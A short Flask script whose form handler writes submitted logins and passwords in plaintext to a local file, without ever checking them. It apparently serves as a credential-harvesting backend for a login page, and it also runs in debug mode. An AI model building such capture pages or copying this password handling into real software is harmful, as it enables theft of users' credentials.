from flask import Flask, render_template, request
app = Flask(__name__)

@app.route("/")
def index():
    return render_template('index.html')

@app.route('/', methods=['post', 'get'])
def form():
    if request.method == 'POST':
        str = ""
        login = request.form.get('login')
        password = request.form.get('password')
        str = "" + login + " " + password + " " + '\n'
        with open('data.txt', 'a') as file:
            file.write(str)
        return render_template('index.html')

if __name__ == "__main__":
    app.run(debug=True)